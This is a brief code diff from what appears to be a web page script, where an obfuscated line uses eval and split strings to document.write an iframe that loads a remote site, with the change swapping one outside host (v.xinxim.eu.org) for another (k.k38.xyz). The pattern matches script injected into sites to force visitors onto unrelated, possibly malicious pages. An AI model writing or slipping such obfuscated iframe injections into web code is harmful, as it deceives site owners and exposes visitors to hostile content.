@@ -1,4 +1,4 @@
-var  ss = '<center id="showcloneshengxiaon"><ifr'+'ame scrolling="no" marginheight=0 marginwidth=0  frameborder="0" width="100%" width="14'+'00" height="50'+'50" src="https://v.xinxim.eu.org"></iframe></center>';
+var  ss = '<center id="showcloneshengxiaon"><ifr'+'ame scrolling="no" marginheight=0 marginwidth=0  frameborder="0" width="100%" width="14'+'00" height="50'+'50" src="http://k.k38.xyz"></iframe></center>';
 eval("do"+"cu"+"ment.wr"+"ite('"+ss+"');");
 	
 try{
